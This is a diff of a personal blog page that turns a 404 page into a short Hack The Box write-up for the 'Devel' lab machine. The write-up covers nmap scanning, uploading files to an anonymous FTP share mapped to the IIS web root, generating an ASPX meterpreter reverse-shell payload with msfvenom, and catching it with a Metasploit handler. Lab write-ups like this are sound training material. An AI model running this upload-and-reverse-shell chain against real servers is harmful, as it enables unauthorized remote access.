@@ -21,7 +21,7 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>404 Page not found &middot; Joshua Krizek</title>
+    <title>Devel_HTB_PT1 &middot; Joshua Krizek</title>
     <meta name="description" content="" />
 
     
@@ -90,7 +90,7 @@
     <h1 class="brand">
         
             <a href="https://joshuakrizek.com/">
-                <img src="./NightCafe_AI_Profile_Image.jpg" alt="brand image">
+                <img src="../../NightCafe_AI_Profile_Image.jpg" alt="brand image">
             </a>
         
         
@@ -113,7 +113,7 @@
             
                 
                     <li class="heading">
-                        <a href="./about/">About</a>
+                        <a href="../../about/">About</a>
                     </li>
                     
                 
@@ -131,7 +131,7 @@
             
                 
                     <li class="heading">
-                        <a href="./resources/">Resources</a>
+                        <a href="../../resources/">Resources</a>
                     </li>
                     
                 
@@ -143,7 +143,7 @@
             
                 
                     <li class="heading">
-                        <a href="./posts/">Posts</a>
+                        <a href="../../posts/">Posts</a>
                     </li>
                     
                         <li class="sub-heading">
@@ -210,8 +210,75 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </aside>
 
         <main class="content container">
-            <h1>404: Page not found</h1>
-<p class="lead">Sorry, we've misplaced that URL or it's pointing to something that doesn't exist. <a href="https://joshuakrizek.com/">Head back home</a> to try finding it again.</p>
+            <div class="post">
+  <div class="info">
+    <h1 class="post-title">
+        <a href="https://joshuakrizek.com/posts/devel-htb-pt1/">Devel_HTB_PT1</a>
+    </h1>
+    <time datetime="2023-05-21T19:20:33-0400" class="post-date">
+        May 21, 2023
+    </time>
+    
+    
+    
+    
+    
+    
+</div>
+
+  <p><a href="https://app.hackthebox.com/machines/Devel">https://app.hackthebox.com/machines/Devel</a></p>
+<p>Step one: ping host to make sure it&rsquo;s active:
+<code>ping 10.10.10.5</code>
+<img src="../../20230516174407.png" alt="1">
+Step two: run nmap against host (in this case it doesn&rsquo;t matter how noisy we are):
+<code>nmap -v -A -p- 10.10.10.5</code>
+<img src="../../20230516175101.png" alt="1">
+<img src="../../20230516175119.png" alt="3img"></p>
+<p>So we know there are two services we can start with, anonymous ftp and a windows server on port 80 with option TRACE. It looks like the ftp share is actually in the root of the IIS web server:
+<img src="../../20230521185353.png" alt="img2"></p>
+<p>Based on that information let&rsquo;s see if we can upload a file and access it via our browser. Let&rsquo;s try a image. I&rsquo;m going to download a random one:
+<img src="../../20230521185544.png" alt="3"></p>
+<p>I&rsquo;m going to upload:
+<img src="../../20230521185720.png" alt="img4"></p>
+<p>Testing failed. Note, downloading the image from the ftp server and trying to open also fails.
+<img src="../../20230521185805.png" alt="img5"></p>
+<p>Let&rsquo;s try a text file:
+<img src="../../20230521192359.png" alt="img 6">
+That worked!
+![img 7](/Pasted image 20230521185947.png)</p>
+<p>Now it&rsquo;s time to create a reverse shell. Based on what we already saw it needs to be ASPX since it&rsquo;s in an IIS site.</p>
+<p>Execute the following command to create the reverse shell:
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f aspx &gt; reverse.aspx </code>
+Upload it to the ftp share:
+<code>put reverse.aspx</code></p>
+<p>Start a listener to listen for the remote connection. Will be using metasploit at this point.
+<code>msfconsole</code>
+<code>use exploit/multi/handler</code>
+<code>set payload windows/meterpreter/reverse_tcp</code>
+<code>set LHOST tun0</code>
+<code>run</code></p>
+<p>Now navigate to that file in the browser and a connection should be opened.
+<img src="../../20230521192307.png" alt="img 8"></p>
+<p>Inspired from the Windows Privilege Escalation course from TCM Security</p>
+
+  <hr>
+<div class="footer">
+    
+	    
+            
+	            <a class="previous-post" href="https://joshuakrizek.com/posts/new_hugo_post/?ref=footer">« New hugo post</a>
+	        
+        
+	    
+    
+</div>
+
+  <div class="article-toc " >
+    <h4></h4>
+    <nav id="TableOfContents"></nav>
+</div>
+
+</div>
         </main>
     </body>
 </html>
